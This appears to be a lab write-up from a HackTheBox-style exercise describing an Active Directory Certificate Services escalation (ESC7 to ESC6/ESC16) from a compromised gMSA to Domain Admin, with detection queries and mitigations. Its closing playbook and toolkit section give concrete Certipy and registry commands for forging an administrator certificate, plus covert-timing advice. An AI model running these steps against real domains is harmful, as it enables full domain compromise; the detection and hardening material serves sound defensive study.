> [Compromised gMSA] -> [ESC7: ManageCA Rights] -> [Registry Manipulation: ESC6/ESC16] -> [Certificate Forgery] -> [Kerberos TGT Acquisition] -> [Domain Admin Access]

* **2.3 Theoretical Analogy:** If the Domain Controller is the vault, the CA is the ID card printer. ESC7 is stealing the keys to the printer room and the administrative manual, allowing the intruder to reprogram the printer to ignore security holograms and print "CEO" on any blank card.



## Attack Vector

| Attribute                  | Technical Details                                                                                                                                    |
| :------------------------- | :--------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Primary Identifiers**    | `PolicyModules\CertificateAuthority_MicrosoftDefault.Policy`<br><br>OID `1.3.6.1.4.1.311.25.2`                                                       |
| **Critical Vulnerability** | Insecure delegation of **ManageCA** permissions to a Managed Service Account (gMSA).                                                                 |
| **Offensive Action**       | Modified CA `EditFlags` to `1376590` (ESC6) and disabled the SID Security Extension (ESC16), enabling certificate forgery for privileged identities. |


### Prerequisites

* **Access Level:** Control over an identity with **ManageCA** or **ManageCertificates** rights (e.g., **gMSA_CA_prod$**).
* **Connectivity:** TCP 135 (RPC), TCP 445 (SMB), and DCOM ports.
* **Target State:** ADCS role installed; target templates (e.g., **User**, **SubCA**) published.



## Threat Hunting & Anamoly Analysis

* **Hunt Hypothesis:** Adversaries with **ManageCA** rights will modify CA registry settings to enable SAN spoofing. Expected artifacts include Registry modification events on the CA and service restarts.
* **Behavioral Outliers:** A Service Account (**gMSA**) executing `New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD` is highly anomalous. Standard gMSAs should not interact with DCOM PKI management objects.
* **Toxic Combinations:** **ReadMSAPassword** on a gMSA that holds **ManageCA** rights creates a direct, unmonitored path to Domain Admin.



## Detection Engineering

* **Telemetry Gap Analysis:** * **Event ID 4657:** Registry value was modified (Audit `HKLM\System\CurrentControlSet\Services\CertSvc`).
* **Event ID 4882:** Security permissions for the CA changed.
* **Event ID 4890/4892:** CA settings changed.


* **Detection-as-Code (KQL/Sigma):**

```kql
SecurityEvent
| where EventID == 4657
| where ObjectName contains "Services\\CertSvc\\Configuration"
| where ObjectValueName in ("EditFlags", "DisableExtensionList")
| project TimeGenerated, Computer, SubjectUserName, ObjectValueName, NewValue

```

* **Resilience Test:** Adversaries may use direct registry manipulation via `reg.exe` or `psrpc` to bypass PowerShell logging. **Countermeasure:** Monitor for `CertSvc` service restarts (Event ID 7036) following any registry write to the `CertSvc` key.



## Toolkit & Implementaion

* **Automation:** `Certipy-ad`, `BloodyAD`, `PSPKI Module`, `Evil-WinRM`.
* **OPSEC Analysis:** The attack requires a CA service restart (`Restart-Service CertSvc`), which is a loud event that will trigger downtime and log generation. Covert operations must time this during maintenance windows.
* **Post-Exploitation:** Retrieval of the **Administrator** NT hash enables **Pass-The-Hash (PtH)** for long-term persistence or the dumping of `ntds.dit` for total domain compromise.



## Defensive Mitigation

* **Technical Hardening:** * **Restrict ACLs:** Remove non-admin identities from CA Management roles.
* **KB5014754 Enforcement:** Set `StrongCertificateBindingEnforcement` to `2` (Full Enforcement) on all Domain Controllers.
* **Audit Persistence:** Monitor for the OID `1.3.6.1.4.1.311.25.2` being added to the `DisableExtensionList`.


* **Personnel Focus:** Tier 0 assets (CAs) must be managed only by a highly restricted "PKI Admins" group with hardware-based MFA.



## Quick Action Playbook

| Step | Objective     | Technical Command / Logic                                               |
| :--: | :------------ | :---------------------------------------------------------------------- |
|  01  | **Enumerate** | `certipy-ad find -vulnerable -u gMSA_CA_prod$ -hashes [HASH]`           |
|  02  | **Escalate**  | `$reg.SetConfigEntry(1376590, "EditFlags", "[POLICY_PATH]")`            |
|  03  | **Exploit**   | `certipy-ad req -template User -upn administrator@fries.htb -sid [SID]` |
|  04  | **Pwn**       | `certipy-ad auth -pfx administrator.pfx -dc-ip [IP]`                    |
